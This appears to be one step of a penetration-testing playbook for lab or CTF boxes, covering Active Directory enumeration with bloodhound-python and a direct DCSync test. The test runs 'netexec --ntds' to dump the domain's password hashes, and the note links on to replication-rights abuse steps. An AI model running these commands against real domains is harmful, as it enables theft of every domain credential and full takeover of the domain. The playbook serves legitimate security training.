# AD - BloodHound

**Step 45 of 50 · AD**

*Collect the directory graph and look for direct rights, group paths, and replication permissions.*

## Run this

```bash
cd $BoxDir/loot
bloodhound-python -d $Domain -u $Username -p $Password -ns $BoxIP -c All --zip
cd $BoxDir
```

## Example output

```

INFO: Found 1 domains
INFO: Found 1 computers
INFO: Found 7 users
INFO: Compressing output into ...zip
```
Before loading the GUI, test DCSync directly — if it works, BloodHound analysis is optional:

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain --ntds 2>&1 | head -5
```

## What did you get?

- [ ] NetExec `--ntds` succeeds immediately → **The account has direct replication rights — go straight to Step 48 · [[AD - DCSync Dump]]**
- [ ] The current account has direct replication rights (BloodHound) → **Go to Step 48 · [[AD - DCSync Dump]]**
- [ ] Account Operators leads to a delegated group → **Go to Step 46 · [[AD - Account Operators Abuse]]**
- [ ] A writable ACL path is shown → **Go to Step 47 · [[AD - DCSync Grant]]**
- [ ] No useful path is shown → **Return to Step 44 · [[AD - Local Credential Search]] or credential validation**

## Notes

Look at the domain object and search for `DS-Replication-Get-Changes-All`. Always try the direct DCSync test first — it saves loading and importing the full BloodHound dataset when the path is already clear.

## Gotcha

> [!warning] 💡
> A BloodHound collection can succeed even when the GUI is unavailable. The collected data is still useful, and a direct DCSync test can confirm the important path.
